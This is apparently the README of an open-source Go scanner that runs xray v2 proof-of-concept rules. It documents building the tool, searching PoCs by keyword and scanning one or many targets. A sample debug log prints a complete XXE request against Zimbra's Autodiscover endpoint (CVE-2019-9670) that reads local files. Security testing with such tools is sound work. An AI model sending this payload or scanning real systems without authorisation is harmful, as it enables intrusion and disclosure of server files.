## 简介
xray poc 发生了一次改版。导致之前的poc引擎不能使用。正好之前工作做过这方面的工作，重新写了一版xray poc v2版本的解工具。

特此开源出来，希望能和研究这方面技术的师傅多交流。

## 使用
### 编译
```shell
go build -x -ldflags "-s -w" -o xray_poc
```
### 查看帮助
```shell
➜  xray-poc-scan-engine ./xray_poc                              
xray poc规则发生了一次变化,导致之前的poc扫描器不能使用，故重新写一版。
                        xray v2版本的poc规则:https://docs.xray.cool/#/guide/poc/v2

Usage:
  xray_poc [command]

Available Commands:
  completion  generate the autocompletion script for the specified shell
  help        Help about any command
  poc         xray_poc search poc查看模块
  scan        xray_poc scan poc扫描模块

Flags:
  -h, --help   help for xray_poc

Use "xray_poc [command] --help" for more information about a command.
```

### poc模块
#### 搜索某个poc。支持模糊匹配
如：./xray_poc poc --search "xxe"
```shell
➜  xray-poc-scan-engine ./xray_poc poc --search "xxe"
 #   Poc Name                                
--- -----------------------------------------
 0   poc-yaml-apache-ofbiz-cve-2018-8033-xxe 
 1   poc-yaml-solr-cve-2017-12629-xxe        
 2   poc-yaml-zimbra-cve-2019-9670-xxe 
```
搜索到所有关于xxe的poc

### scan模块
### 扫描指定目标，使用指定pocName
如：./xray_poc scan --u "http://h11ba1.com" --poc "poc-yaml-zimbra-cve-2019-9670-xxe"
```go
➜  xray-poc-scan-engine ./xray_poc scan --u "http://h11ba1.com" --poc "poc-yaml-zimbra-cve-2019-9670-xxe"
2022/02/18 - 15:19:48.501  ▶ [Debug] request:POST /Autodiscover/Autodiscover.xml HTTP/1.1
Host: h11ba1.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169

<!DOCTYPE xxe [<!ELEMENT name ANY ><!ENTITY xxe SYSTEM "file:./" >]><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"><Request><EMailAddress>test@test.com</EMailAddress><AcceptableResponseSchema>&xxe;</AcceptableResponseSchema></Request></Autodiscover>
2022/02/18 - 15:19:48.515  ▶ [Debug] res false response.body.bcontains(b"zmmailboxd.out") && response.body.bcontains(b"Requested response schema not available")
2022/02/18 - 15:19:48.515  ▶ [Debug] poc:poc-yaml-zimbra-cve-2019-9670-xxe rule url:http://h11ba1.com/Autodiscover/Autodiscover.xml expression execute failed
#   target-url          poc-name                            status
--- ------------------- ----------------------------------- --------
0   http://h11ba1.com   poc-yaml-zimbra-cve-2019-9670-xxe   false
```
### 扫描指定目标，不指定poc，默认使用所有poc
如：./xray_poc scan --u "http://h11ba1.com" 

### 批量扫描多个目标
如： ./xray_poc scan --f "test.txt" --poc "xxe"
```go
 #   target-url          poc-name                                  status 
--- ------------------- ----------------------------------------- --------
 0   http://h11ba1.com   poc-yaml-apache-ofbiz-cve-2018-8033-xxe   false  
 1   http://h22ba2.com   poc-yaml-apache-ofbiz-cve-2018-8033-xxe   false  
 2   http://h11ba1.com   poc-yaml-zimbra-cve-2019-9670-xxe         false  
 3   http://h22ba2.com   poc-yaml-zimbra-cve-2019-9670-xxe         false
```

## 扫描结果成功 `status` 为 `true`

## TODO
本项目两三天赶工出来，肯定存在很多bug。师傅们发现可以给我提issues。有空肯定及时更新。

待完善模块：
### [ ]增加proxy模块
### [ ]完善dns反连功能
### [ ]完善漏洞结果判断功能
### [ ]优化结果显示功能

## 参考项目
https://github.com/jjf012/gopoc

## 免责声明

本项目只用于学习交流目的。

由于传播、利用该工具（下简称本工具）提供的检测功能而造成的任何直接或者间接的后果及损失，均由使用者本人负责，开发者 不为此承担任何责任。
